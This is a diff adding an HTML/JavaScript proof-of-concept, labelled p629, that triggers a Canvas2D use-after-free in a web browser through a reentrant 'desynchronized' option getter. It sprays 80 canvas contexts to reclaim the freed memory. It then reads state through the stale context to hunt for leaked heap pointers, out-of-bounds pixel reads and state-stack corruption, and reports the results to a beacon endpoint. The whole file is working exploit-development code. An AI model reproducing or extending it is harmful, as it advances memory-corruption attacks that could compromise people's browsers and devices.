@@ -1,0 +1,420 @@
+<!--
+  p629: Canvas2D UAF — internal struct offset map + pointer leak hunt
+
+  Trigger: p553 desynchronized-getter reentrancy (confirmed working).
+  After same-type reclaim, stale `inner` reads reclaimed spray context.
+
+  Goal: find ANY internal pointer leaking through the R/W channel.
+  Strategy:
+    1. Trigger UAF, spray, confirm alias (p553 pattern)
+    2. Read all numeric properties through stale — encode as raw hex
+    3. Dimension mismatch test (original=1x1, spray=200x200) — getImageData OOB?
+    4. save() depth forcing Vector realloc — does any value shift?
+    5. font change + measureText — internal heap churn
+    6. createLinearGradient coordinates — pointer leak through gradient state?
+    7. canvas.toBlob/toDataURL timing side channel?
+
+  CRASH_CLASS: MODERATE (UAF access on freed/reclaimed memory)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p629</title></head>
+<body>p629: canvas2d offset map
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+var L = document.getElementById('log');
+var bQ = [];
+var retained = [];
+
+function emit(tag, msg) {
+  var s = tag + ' ' + (msg || '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 3) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 6).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P629-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+var f64 = new Float64Array(1);
+var u8 = new Uint8Array(f64.buffer);
+function d2h(d) {
+  f64[0] = d;
+  var h = '';
+  for (var i = 7; i >= 0; i--) h += ('0' + u8[i].toString(16)).slice(-2);
+  return h;
+}
+
+function readAll(ctx) {
+  var t;
+  try { t = ctx.getTransform(); } catch(e) { return null; }
+  return {
+    a: t.a, b: t.b, c: t.c, d: t.d, e: t.e, f: t.f,
+    lw: ctx.lineWidth, ga: ctx.globalAlpha, sb: ctx.shadowBlur,
+    sox: ctx.shadowOffsetX, soy: ctx.shadowOffsetY,
+    ml: ctx.miterLimit, ldo: ctx.lineDashOffset
+  };
+}
+
+function dumpAll(p, label) {
+  emit(label, 'a=' + d2h(p.a) + ' b=' + d2h(p.b) + ' c=' + d2h(p.c));
+  emit(label+'2', 'd=' + d2h(p.d) + ' e=' + d2h(p.e) + ' f=' + d2h(p.f));
+  emit(label+'3', 'lw=' + d2h(p.lw) + ' ga=' + d2h(p.ga) + ' ml=' + d2h(p.ml));
+  emit(label+'4', 'sb=' + d2h(p.sb) + ' sox=' + d2h(p.sox) + ' soy=' + d2h(p.soy) + ' ldo=' + d2h(p.ldo));
+  var all = [p.a,p.b,p.c,p.d,p.e,p.f,p.lw,p.ga,p.sb,p.sox,p.soy,p.ml,p.ldo];
+  var names = ['a','b','c','d','e','f','lw','ga','sb','sox','soy','ml','ldo'];
+  for (var i = 0; i < all.length; i++) {
+    if (!isNaN(all[i]) && all[i] !== 0 && Math.abs(all[i]) > 1e10) {
+      emit(label+'-PTR', names[i] + '=' + d2h(all[i]) + ' (' + all[i] + ')');
+    }
+  }
+}
+
+try {
+emit('START', navigator.userAgent ? navigator.userAgent.slice(0,60) : 'no-ua');
+
+// ================================================================
+// Phase 1: Trigger UAF via desynchronized getter (p553 pattern)
+// ================================================================
+var canvas = document.createElement('canvas');
+canvas.width = 1; canvas.height = 1;
+document.body.appendChild(canvas);
+retained.push(canvas);
+
+var inner = null;
+var getterFired = 0;
+var opts = {};
+Object.defineProperty(opts, 'desynchronized', {
+  get: function() {
+    getterFired++;
+    if (getterFired === 1) {
+      inner = canvas.getContext('2d');
+    }
+    return false;
+  },
+  enumerable: true
+});
+
+var outer = null;
+try { outer = canvas.getContext('2d', opts); } catch(e) { emit('ERR', String(e)); }
+retained.push(outer, inner);
+
+emit('TRIGGER', 'getter=' + getterFired + ' inner=' + !!inner + ' outer=' + !!outer + ' same=' + (outer === inner));
+if (outer === inner || !inner) { emit('PATCHED', 'no UAF'); flush(); return; }
+
+// ================================================================
+// Phase 2: Spray with distinctive sentinels per index (spray FIRST, read AFTER)
+// ================================================================
+var SPRAY = 80;
+var sprayCtx = [];
+var sprayCanvases = [];
+for (var i = 0; i < SPRAY; i++) {
+  var sc = document.createElement('canvas');
+  sc.width = 200; sc.height = 200;
+  var sctx = sc.getContext('2d');
+  if (sctx) {
+    sctx.setTransform(100+i, 200+i, 300+i, 400+i, 500+i, 600+i);
+    sctx.lineWidth = 700 + i;
+    sctx.globalAlpha = 0.01 * (i + 1);
+    sctx.miterLimit = 800 + i;
+    sctx.shadowBlur = 0;
+    sctx.shadowOffsetX = 1000 + i;
+    sctx.shadowOffsetY = 1100 + i;
+    sctx.lineDashOffset = 1200 + i;
+    sprayCtx.push(sctx);
+    sprayCanvases.push(sc);
+    retained.push(sc, sctx);
+  }
+}
+emit('SPRAY', 'n=' + sprayCtx.length);
+
+// ================================================================
+// Phase 3: Channel verification — read through stale
+// ================================================================
+var props = readAll(inner);
+if (!props) { emit('READ-FAIL', 'getTransform null after spray'); flush(); return; }
+
+dumpAll(props, 'POST');
+
+// Find which spray context was reclaimed
+var hitIdx = -1;
+for (var i = 0; i < SPRAY; i++) {
+  if (Math.abs(props.a - (100 + i)) < 0.01) { hitIdx = i; break; }
+}
+emit('HIT', hitIdx >= 0 ? 'spray[' + hitIdx + ']' : 'NO-RECLAIM');
+if (hitIdx < 0) { flush(); return; }
+
+var alias = sprayCtx[hitIdx];
+var aliasCanvas = sprayCanvases[hitIdx];
+
+// Check ALL properties for mismatches vs expected spray values
+var expected = {
+  a: 100+hitIdx, b: 200+hitIdx, c: 300+hitIdx, d: 400+hitIdx,
+  e: 500+hitIdx, f: 600+hitIdx, lw: 700+hitIdx,
+  ga: 0.01*(hitIdx+1), ml: 800+hitIdx, sb: 0,
+  sox: 1000+hitIdx, soy: 1100+hitIdx, ldo: 1200+hitIdx
+};
+var mismatches = [];
+var names = ['a','b','c','d','e','f','lw','ga','ml','sb','sox','soy','ldo'];
+for (var ni = 0; ni < names.length; ni++) {
+  var n = names[ni];
+  var diff = Math.abs(props[n] - expected[n]);
+  if (diff > 0.01) mismatches.push(n + ':exp=' + expected[n] + ',got=' + props[n]);
+}
+emit('MATCH', mismatches.length > 0 ? mismatches.join(' | ') : 'ALL-MATCH');
+
+// ================================================================
+// Phase 4: Canvas identity confusion
+// ================================================================
+try {
+  var innerCanvasRef = inner.canvas;
+  var aliasCanvasRef = alias.canvas;
+  emit('CANVAS-ID', 'inner.canvas===original:' + (innerCanvasRef === canvas) +
+    ' inner.canvas===spray:' + (innerCanvasRef === aliasCanvas) +
+    ' alias.canvas===spray:' + (aliasCanvasRef === aliasCanvas));
+} catch(e) { emit('CANVAS-ID-ERR', String(e).slice(0,60)); }
+
+// ================================================================
+// Phase 5: Dimension mismatch — original=1x1, spray=200x200
+// getImageData through stale wrapper — does it use original or spray dimensions?
+// ================================================================
+try {
+  inner.setTransform(1, 0, 0, 1, 0, 0);
+  inner.fillStyle = '#ff0000';
+  inner.fillRect(0, 0, 200, 200);
+
+  // Read pixels at coordinates that exceed original canvas but fit spray canvas
+  var pix150 = inner.getImageData(150, 150, 1, 1);
+  emit('DIM-150', 'rgba=' + pix150.data[0] + ',' + pix150.data[1] + ',' + pix150.data[2] + ',' + pix150.data[3]);
+
+  // Try reading past spray canvas boundary (200x200)
+  var oob = false;
+  try {
+    var pixOob = inner.getImageData(250, 250, 1, 1);
+    emit('DIM-OOB', 'rgba=' + pixOob.data[0] + ',' + pixOob.data[1] + ',' + pixOob.data[2] + ',' + pixOob.data[3] + ' NO-THROW');
+    oob = true;
+  } catch(e) {
+    emit('DIM-OOB', 'threw=' + String(e).slice(0,60));
+  }
+
+  // Read a large block and check for non-zero values outside drawn area
+  inner.fillStyle = '#000000';
+  inner.fillRect(0, 0, 200, 200);
+  inner.fillStyle = '#ff0000';
+  inner.fillRect(50, 50, 100, 100);
+  var bigBlock = inner.getImageData(0, 0, 200, 200);
+  var nonRed = 0, nonBlack = 0;
+  for (var pi = 0; pi < bigBlock.data.length; pi += 4) {
+    var r = bigBlock.data[pi], g = bigBlock.data[pi+1], b = bigBlock.data[pi+2];
+    if (r !== 0 && r !== 255) nonRed++;
+    if (r === 0 && g === 0 && b === 0) continue;
+    if (r === 255 && g === 0 && b === 0) continue;
+    nonBlack++;
+  }
+  emit('DIM-BLOCK', 'nonRed=' + nonRed + ' nonBlack=' + nonBlack + ' total=' + (bigBlock.data.length/4));
+} catch(e) { emit('DIM-ERR', String(e).slice(0,80)); }
+
+// ================================================================
+// Phase 6: save() depth — force Vector<State> realloc
+// After realloc, the state pointer changes. Does any readable property
+// return a value that looks like a pointer?
+// ================================================================
+try {
+  // Reset to known values
+  inner.setTransform(42.42, 0, 0, 42.42, 0, 0);
+  inner.lineWidth = 10;
+  inner.globalAlpha = 1.0;
+  inner.miterLimit = 10;
+
+  var preSave = readAll(inner);
+
+  // Push 30 saves to force reallocation of the state stack
+  for (var si = 0; si < 30; si++) inner.save();
+
+  var postDeep = readAll(inner);
+  if (preSave && postDeep) {
+    var deltas = [];
+    for (var ni = 0; ni < names.length; ni++) {
+      var n = names[ni];
+      if (preSave[n] !== postDeep[n]) {
+        deltas.push(n + ':' + d2h(preSave[n]) + '->' + d2h(postDeep[n]));
+      }
+    }
+    emit('SAVE-DEEP', deltas.length > 0 ? deltas.join(' ') : 'NO-CHANGE');
+  }
+
+  // Restore all
+  for (var ri = 0; ri < 30; ri++) inner.restore();
+
+  // Read again after restore
+  var postRestore = readAll(inner);
+  if (postRestore) {
+    emit('RESTORED', 'a=' + postRestore.a + ' lw=' + postRestore.lw);
+  }
+} catch(e) { emit('SAVE-ERR', String(e).slice(0,80)); }
+
+// ================================================================
+// Phase 7: Interleaved save/restore through stale vs alias
+// If state stack is shared, interleaved ops might corrupt the pointer
+// ================================================================
+try {
+  inner.setTransform(1, 0, 0, 1, 0, 0);
+  inner.lineWidth = 111;
+  inner.save();
+  inner.lineWidth = 222;
+
+  // Now save through alias too
+  alias.save();
+  alias.lineWidth = 333;
+
+  // Restore through inner — does it pop inner's save or alias's?
+  inner.restore();
+  var afterInterleavedI = inner.lineWidth;
+  emit('INTERLEAVE', 'inner.lw after inner.restore=' + afterInterleavedI + ' (exp=111 if shared stack)');
+
+  alias.restore();
+  var afterInterleavedA = alias.lineWidth;
+  emit('INTERLEAVE2', 'alias.lw after alias.restore=' + afterInterleavedA);
+
+  // Read through stale after both restores
+  var p7 = readAll(inner);
+  if (p7) emit('INTERLEAVE3', 'lw=' + p7.lw + ' a=' + p7.a);
+} catch(e) { emit('INTERLEAVE-ERR', String(e).slice(0,80)); }
+
+// ================================================================
+// Phase 8: Font + measureText — heap allocation probe
+// Font strings are stored as internal String objects. Changing font
+// through stale might produce an interesting state.
+// ================================================================
+try {
+  inner.font = '72px monospace';
+  var tm1 = inner.measureText('WWWWWWWW');
+  emit('FONT1', 'font=' + inner.font + ' width=' + tm1.width);
+
+  // Read font through alias
+  emit('FONT-ALIAS', 'alias.font=' + alias.font);
+
+  // Change font to something exotic
+  inner.font = '200px "Times New Roman"';
+  var tm2 = inner.measureText('M');
+  emit('FONT2', 'font=' + inner.font + ' Mwidth=' + tm2.width);
+} catch(e) { emit('FONT-ERR', String(e).slice(0,80)); }
+
+// ================================================================
+// Phase 9: createImageData — returns fresh ImageData
+// The ArrayBuffer backing it is heap-allocated. Check for any pointer
+// values in the buffer's neighborhood via the transform channel.
+// ================================================================
+try {
+  var img1 = inner.createImageData(100, 100);
+  emit('IMGDATA', 'w=' + img1.width + ' h=' + img1.height + ' len=' + img1.data.length);
+
+  // Put some data, draw it, read back
+  for (var di = 0; di < 400; di++) img1.data[di] = 0xAA;
+  inner.putImageData(img1, 0, 0);
+
+  // Read transform immediately after putImageData — any shift?
+  var postPut = readAll(inner);
+  if (postPut) dumpAll(postPut, 'POSTPUT');
+} catch(e) { emit('IMGDATA-ERR', String(e).slice(0,80)); }
+
+// ================================================================
+// Phase 10: toDataURL through alias canvas — triggers PNG encoding
+// internally, which reads bitmap and calls into system PNG encoder
+// ================================================================
+try {
+  var url1 = aliasCanvas.toDataURL('image/png');
+  emit('DATAURL', 'len=' + url1.length + ' start=' + url1.slice(0,30));
+} catch(e) { emit('DATAURL-ERR', String(e).slice(0,80)); }
+
+// ================================================================
+// Phase 11: String property raw dump
+// fillStyle, strokeStyle, shadowColor are strings internally.
+// After UAF reclaim, check if they contain unexpected data.
+// ================================================================
+try {
+  emit('STRINGS', 'fillStyle=' + inner.fillStyle + ' strokeStyle=' + inner.strokeStyle +
+    ' shadowColor=' + inner.shadowColor + ' font=' + inner.font +
+    ' textAlign=' + inner.textAlign + ' textBaseline=' + inner.textBaseline +
+    ' lineCap=' + inner.lineCap + ' lineJoin=' + inner.lineJoin);
+
+  // Check if globalCompositeOperation is expected
+  emit('STRINGS2', 'gco=' + inner.globalCompositeOperation +
+    ' direction=' + (inner.direction || 'undefined'));
+} catch(e) { emit('STRING-ERR', String(e).slice(0,80)); }
+
+// ================================================================
+// Phase 12: Second UAF trigger — can we get a fresh dangling pointer
+// to the SAME slot, but this time with cross-canvas dimensions?
+// Trigger on a 1x1 canvas, reclaim with 200x200, then getImageData
+// with original dimensions on the new stale pointer
+// ================================================================
+try {
+  var c2 = document.createElement('canvas');
+  c2.width = 1; c2.height = 1;
+  document.body.appendChild(c2);
+  retained.push(c2);
+
+  var inner2 = null;
+  var g2 = 0;
+  var opts2 = {};
+  Object.defineProperty(opts2, 'desynchronized', {
+    get: function() { g2++; if (g2 === 1) { inner2 = c2.getContext('2d'); } return false; },
+    enumerable: true
+  });
+  var outer2 = c2.getContext('2d', opts2);
+  retained.push(outer2, inner2);
+
+  if (inner2 && outer2 !== inner2) {
+    emit('UAF2', 'second trigger OK');
+
+    // Spray with BIG canvases
+    for (var i2 = 0; i2 < 80; i2++) {
+      var bc = document.createElement('canvas');
+      bc.width = 300; bc.height = 300;
+      var bctx = bc.getContext('2d');
+      if (bctx) {
+        bctx.setTransform(2000+i2, 0, 0, 2000+i2, 0, 0);
+        bctx.fillStyle = '#00ff00';
+        bctx.fillRect(0, 0, 300, 300);
+        retained.push(bc, bctx);
+      }
+    }
+
+    // Read transform to confirm reclaim
+    var p12 = readAll(inner2);
+    if (p12 && p12.a >= 2000) {
+      emit('UAF2-RECLAIM', 'a=' + p12.a);
+
+      // Original inner2 was from a 1x1 canvas.
+      // Try getImageData at coordinates that exceed 1x1 but fit in 300x300
+      try {
+        var pix2 = inner2.getImageData(0, 0, 2, 2);
+        emit('UAF2-PIX', 'w=' + pix2.width + ' h=' + pix2.height + ' r0=' + pix2.data[0] + ',' + pix2.data[1] + ',' + pix2.data[2]);
+      } catch(e) {
+        emit('UAF2-PIX-ERR', String(e).slice(0,60));
+      }
+
+      try {
+        var pix3 = inner2.getImageData(100, 100, 1, 1);
+        emit('UAF2-FAR', 'rgba=' + pix3.data[0] + ',' + pix3.data[1] + ',' + pix3.data[2] + ',' + pix3.data[3]);
+      } catch(e) {
+        emit('UAF2-FAR-ERR', String(e).slice(0,60));
+      }
+    } else {
+      emit('UAF2-NORECLAIM', 'a=' + (p12 ? p12.a : 'null'));
+    }
+  } else {
+    emit('UAF2-FAIL', 'second trigger failed');
+  }
+} catch(e) { emit('UAF2-ERR', String(e).slice(0,80)); }
+
+emit('ALIVE', 'all phases complete');
+flush();
+window.__p629 = retained;
+} catch(e) { emit('FATAL', String(e).slice(0,200)); flush(); }
+})();
+</script>
+</body></html>
